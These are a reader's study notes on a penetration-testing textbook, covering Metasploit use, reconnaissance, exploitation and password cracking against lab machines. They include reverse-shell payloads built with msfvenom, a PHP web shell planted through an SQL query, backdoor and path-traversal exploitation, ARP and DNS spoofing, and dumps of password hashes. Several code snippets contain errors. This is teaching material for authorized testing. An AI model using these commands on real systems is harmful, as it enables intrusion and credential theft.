---
Title: Penetration Testing - A hands-on introduction to hacking
Author: Gorgia Weidman
ISBN-10: 1-59327-564-1
ISBN-13: 978-1-59327-564-8
...

# Penetration Testing

## Chapter 0 - Penetration Testing Primer

The stages of the Penetration test:
- pre-engagement = goals and scope
- information-gathering = identify potential ways to connect
- threat-modeling = develop an action plan
- vulnerability analysis = vulnerability scanning 
- exploitation = weaponizing and exploiting
- post exploitation = pivot to deeper targets
- reporting = summary of the findings

Pre-engagement: scpope, testing window, contact information, authorizations, payment terms
Information gathering: Open Source Intelligence gathering
Threat Modeling: define the most important threats, ddos, trade secrets, etc...
Vulnerability Analysis: actively discover vulnerabilities with scanners
Exploitation: once a vulnerability is identified, exploit only if 100% sure
Post Exploitaton: Once initial access is possible, find juicy targets
Reporting: Executive and technical reporting is important

## Chapter 1 - Setting up your lab

1. VMware, Kali Linux, networking 101
2. Installing Nessus
   a. Iownload package: NessusX.X.X-debian6_amd64.deb
   b. Install package: dpkg -i NessusX.X.X-debian6_amd64.deb
   c. /etc/init.d/nessusd start 
   d. Configure Nessus: https://localhost:8834
3. Additional software
   a. apt-get install mingw32
   b. wget http://web.archive.org/web/20130514132719/http://nullsecurity.net/tools/binary/Hyperion-1.0.zip
      - unzip Heprion.zip
      - i586-mingw32msvc-c++ Hyperion-1.0/Src/Crypter/\*.cpp -o hyperion.exe
   c. wget https://github.com/ChrisTruncer/Veil/archive/master.zip
      - unzip master.zip
      - ./Veil-Evasion-master/setup/setup.sh
   d. vi /etc/ettercap/etter.conf
      - change privs, ec_uid and ec_gid = 0
      - redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
      - redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
   e. might need an Androit emulator
   f. smartphone pentest framework
3. Create your target: windows XP :(
4. Create a second target: ubuntu 8.10 :(
5. Create Windows7 target :(

## Chapter 2 - Using Kali Linux

The book is outdated as it was written with Kali 1.0.6.

Creating users, navigating in linux CLI, handling text files with vi, grep, sed and awk.
Managing process, services and networking. Netstat, Netcat, ifconfig, cron

## Chapter 3 - Programming

build your own tools!

Shell scripting, a simple network scanner that scans a /24 with 1 icmp echo request. very limited.

"""

    #!/bin/bash
    #Simple script pinging /24 network only.
    if [ "$1" == "" ]
    echo "Usage: ./pingscript.sh [network]"
    echo "example: ./pingscript.sh 192.168.20"
    else
    for x in `seq 1 254`; do
    ping -c 1 $1.$x | grep "64 bytes" | cut -d" " -f4 | sed 's/.$//'
    done
    fi

"""

Python, you want to learn python development

"""

    #!/usr/bin/python
    import socket
    ip = raw_input("enter the ip: ")
    port = input("Enter the port: ")
    #you might want to check connect_ex that returns 0 when connection possible
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if s.connect_ext((ip, port)):
        print "Port", port, "is closed"
    else:
        print "Port", port, "is open"

"""

Writing and compiling C Programs can be handy
Compile this code with "gcc cprogam.c -o HelloWorld"

"""

    #include <stdio.h>
    int main(int argc, char *argv[])
    {
        if(argc < 2)
        {
            printf("%s\n", "Pass your name as an argument");
            return 0;
        }
        else
        {
            printf(Hello %s\n), argv[1]);
            return 0;
        }
    }
    
"""

## Chapter 4 - Using Metasploit Framework

Read "Metasploit - a Pentesters's guide" for more information.

Initiate the services:

    service postgresql start
    service metasploit start
    msfconsole
    
1. Within metasploit console, use the *search* and *info* commands: "search ms08-067" and "info ms08-067"
2. Once you settle on that exploit, type the *use* command: "use windows/smb/ms08_067_netapi".
3. View your options with the *show* command : "show options"
4. Configure your target with the *set* command: "set RHOST 10.1.2.3"... Nobody moves the SMB prot to something else than 445, right ?
5. Pick the right target for your exploit, make sure to pick the right one... use use automatic targeting
6. Find and configure a compatible payload "show payloads" or use the default one
7. "exploit"

You might want to change the default 4444 listener port metasploit uses. 4444 traffic is kind of a red flag. "set LPORT 443"

MSFCLI is an powerful interface that isn't interactive. It does what you tell it to do, when you know what you're doing.
Example: "msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 PAYLOAD=windows/shell_bind_tcp E" 

MSFVENOM allows you to create an executable with the desired custom payload
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.100 LPORT=31337 -f exe > callhome.exe
Host this file in /var/www directory to serve it with Kali Apache, "service apache2 start"
Before you switch to windowsXP and access the website to download the exe file, start the handler on kali
1. "use multi/handler"
2. "set PAYLOAD windows/meterpreter/reverse_tcp"
3. "set LHOST 192.168.20.100
4. "set LPORT 31337"
5. "exploit"

## Chapter 5 - Information gathering

Dumpster diving, database dumps, social engineering... and OSINT.

**information gathering**
Netcraft, a company who logs uptime and queries servers. Passive information gathering. http://www.netcraft.com 

**information gathering**
The "host" command is a powerfull linux tool to get information about DNS

    host -t ns zoneedit.com
    host -l zoneedit.com ns2.zoneedit.com
    
**information gathering**
The "harvester" is a tool that might uncover email addresses and other useful information.

    theharvester -d bulbsecurity.com -l 500 -b all

### Quote
"-[...] once we start actively querying systems, we are moving into murky legal territory. Attempting to break into computers without permission is, of course, illegal in many countries.-"

**information gathering**

Nmap

SYN Scanning

    #syn scan
    nmap -sS 192.168.20.10-12 -oA syn_scan.xml
    #version scan
    nmap -sV 192.168.20.10-12 -oA version_scan.xml
    #udp scan
    nmap -sU 192.168.20.10-12 -oA udp_scan.xml
    #scan all the ports! Noisy, but a good rule of thumb for pentesting
    nmap -p 1-65545 -sV 192.168.20.10 -oA all_ports.xml
    #use nse scripts
    nmap -sC 192.168.20.10-12 -oA nse_scripts_scan.xml
    nmap --script=nfs-ls 192.168.20.11 -oA nse_nfs.xml

### Quote
"-Pentesting doesn’t get much easier than piggybacking on an attacker who already owns a system-"

## Chapter 6 - Finding vulnerabilties

Nessus is a powerful vulnerability scanner that might be free to use under the community license. It is restricted to 16 hosts, but it's good to learn. The professional license may be interresting for pentesters.
See the Nessus cheatsheet for more information

Nmap scripting engine. Nmap comes with a list of scripts and you can develop your own tools and add them to NSE.
Scripts can be found in "/usr/share/nmap/scripts" in kali linux distro. use the "nmap --script-help default" command to get more information about a script

Metasploit also has scanners to discovr vulnerabilities.

    msf> use scanner/ftp/anonymous
    msf aux(anon) > set RHOSTS 192.168.20.100-101
    msf aux(anon) > exploit
    
Having a anonymous ftp server available may, or may not be a serious issue. If there is no way to execute what you upload, you can't exploit this vulnerability.

Some Metasploit modules let you "check" if a target is vulnerable. "use windows/smb/smb_067_netapi" then "set RHOST 10.0.0.1" then "check".

Nikto is a web app vulnerabilty scanner that can help when you find a default apache installation

    nikto -h 10.0.0.123
    
**vulnerability discovery**
OSVDB http://osvdb.com is a great repository of opensource software, such as tikiwiki with detailed information.

Phpmyadmin is a great way to access a MySQL database, ofter as root.

**default credentials**
wampp:xampp

Cadaver is a webdav client used to obtain cli on a target:

    cadaver https://10.0.0.123/webdav

**information gathering**
Target = Zervit 0.4

    nc 192.168.0.123 3232
    GET / HTTP/1.1
    HTTP/1.1 200 OK
    Server: Zervit 0.4
    ...
    GET /../../../../../../../../boot.ini HTTP/1.1
    HTTP/1.1 200 OK
    ...
    WINDOWS="Microsoft Windows XP Home Edition"
    ...
    
**information gathering**
Finding Valid Credentials, valid email addresses can be done querying an SMTP server

    nc 192.168.0.10 25
    220 georgia.com SMTP Server SLmail
    VRFY georgia
    250 Georgia<georgia@>
    VRFY john
    551 User not local
    
## Chapter 7- Capturing traffic

Book explains how to use wireshark to capture an ftp login, filter for ftp, read password. Port number x0015 is 21, FTP.

**exploit**
Arp poisoning is used to mitm between client and server.

    echo 1 > /proc/sys/net/ipv4/ip_forward
    arpspoof -i eth0 -t 192.168.20.11 192.168.20.10
    arpspoof -i eth0 -t 192.168.20.10 192.168.20.11
    
**exploit**
DNS poisoning is used to inject DNS resolutions that are not legit.

    cat poisoned_host.txt
    192.168.20.9 www.gmail.com
    dnsspoof -i eth0 -f poisoned_host.txt
    
SSL stripping is a technique for MITM, more in the SSLSTRIP cheatsheet.

## Chapter 8 - Exploitation

Exploit the default credentials on webdav by connecting cadaver and using the "put" command

    cat test.txt
    test
    cadaver http://192.168.20.10/webdav
    dav:/webdav/>put test.txt
    
That's fun, but that only uploads a txt file to the server... for real fun, upload a reverse tcp payload:

    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.20.66 LPORT=31337 -f raw > meterpreter.php
    dav:/webdav/> put meterpreter.php
    msf > use multi/handler
    msf exploit(handler) > set payload php/meterpreter/reverse_tcp
    msf exploit(handler) > set LHOST 192.168.20.66
    msf exploit(handler) > set LPORT 31337
    msf exploit(handler) > exploit
    **browse to 192.168.20.123/meterpreter.php**
    meterpreter> getuid
    SYSTEM

**payload**
From the phpmyadmin SQL tab, use this query:

    SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\shell.php" 

Then, browse to http://target/shell.php?cmd=ipconfig

**loot**

    /WINDOWS/repair/system
    /WINDOWS/repair/sam

**exploit**
vsftpd 2.3.4 had a backdoor opening a root shell on port 6200
    
    ftp 192.168.20.21
    Name: bingo:)
    nc 192.168.20.21 6200
    cat /etc/shadow
    georgia:$1$CNp3mty6$|RWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7:::
    
 
**exploit**
Exploiting an open NFS share for fun and profit

    mkdir /tmp/mount
    mount -t nfs -o nolock 192.168.20.11:/export/georgia /tmp/mount
    cd /tmp/mount/.ssh
    ssh-keygen
    cat ~/.ssh/id_rsa.pub >> /tmp/mount/.ssh/authorized_keys
    ssh georgia@192.168.20.11
    
    or
    
    cp id_rsa.pub ~/.ssh/id_rsa.pub
    cp id_rsa ~/.ssh/id_rsa
    ssh-add
    ssh georgia@192.168.20.11
    
Both are equivalent... somewhat...

## Chapter 9 - Password attacks

Most password cracking tools require a "userlist.txt" and a "passwordlist.txt"
There are tools to help you build such lists.

**password cracking**

    # this generates a wordlist via depth 3 of somecompany's website using all words win minimum five chars.
    cewl -w somecompany.txt -d 3 -m 5 www.somecompany.com
    
    # this tool generates a huge password list with the characters you give it
    crunch 7 7 ABV
    AAAAAAA
    AAAAAAB
    AAAAAAC
    ...
    
    #this tool uses a userlist ad passwordlist on pop3 service
    hydra -L userlist.txt -P passwordfile.txt 192.168.20.10 pop3

**password cracking**

meterpreter > hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
georgia:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:df40c521ef762bb7b9767e30ff112a3c:938ce7d211ea733373bcfc3e6fbb3641:::
secret:1004:e52cac67419a9a22664345140a852f61:58a478135a93ac3bf058a5ea0e8fdb71:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:bc48640a0fcb55c6ba1c9955080a52a8:::

**windows password cracking**
Use bkhive and samdump2 to decrypt windows hashes.

    bkhive system xpkey.txt
    samdump2 sam xpkey.txt

**physical access**

    echo "bios.delay = 4000" >> virtualmachine.vmx
    **boot from kali iso**
    root@kali:# umkdir -p /mnt/sda1
    vmount /dev/sda1 /mnt/sda1
    cd /mnt/sda1/Windows/System32/config/
    bkhive SYSTEM out
    samdump2 SAM out 

**hashing algorithms**
LM vs. NTLM Hashing Algorithms

    #USERNAME:USERID:LMHASH:NTLMHASH
    Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
    Georgia Weidman:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

- LM hashes are truncated to 14 characters
- passwords are converted to all UPPERCASE
- passwords less than 14 characters are null-padded to 14 characters
- the 14 characters are broken into two 7 character passwords that are hashed separately
- Next, the password splits are used to encrypt KGS!@#$% with 3des

Cracking a LM password does not tell you the case of the letters used in the password, it will result in PASSWORD123 for example.
Now whether it is Password123 or PASSword123, the story doesn't tell yet.
You must use the fourth field from the password hash collected previously.

JTR

    root@kali# cat linuxpasswords.txt
    georgia:$1$CNp3mty6$lRWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7:::
    #the $1 field in the hash indicates MD5
    john linuxpasswords.txt --wordlist=passwordfile.txt


Note for rainbow tables: MD5 hash for 1-9 character passwords for lowercase and numbers reach 80GB.
hint: for LM, the rainbow table is 32GB

You can download pregenerated sets of hashes from http://project-rainbowcrack.com/table.htm. The tool Rcrack in Kali can be used to sift through the rainbow tables for the correct plaintext.

Why bother cracking when a tool can give you the password you're looking for. that's what WCE.exe does.

    C:\wce.exe -w
    georgia\HOSTNAME:password
    #You can download the latest version of WCE from http://www.ampliasecurity.com/research/wcefaq.html.
    
## Chapter 10 - Client-side exploitation 

WindowsXP client side attack

    msf > use exploit/windows/browser/ms10_002_aurora
    set SRVHOST 192.168.20.123
    set SRVPORT 80
    set URIPATH aurora
    set payload windows/meterpreter/reverse_tcp
    set LHOST 192.168.20.123
    exploit
    jobs
    kill 0
    
The book contains client side exploits such as Java, PDF, winamp.

## Chapter 11 - Social Engineering
    
Check out TrustedSec's social engineer toolkit: setoolkit

## Chapter 12 - Bypassing Antivirus Applications AV evasion


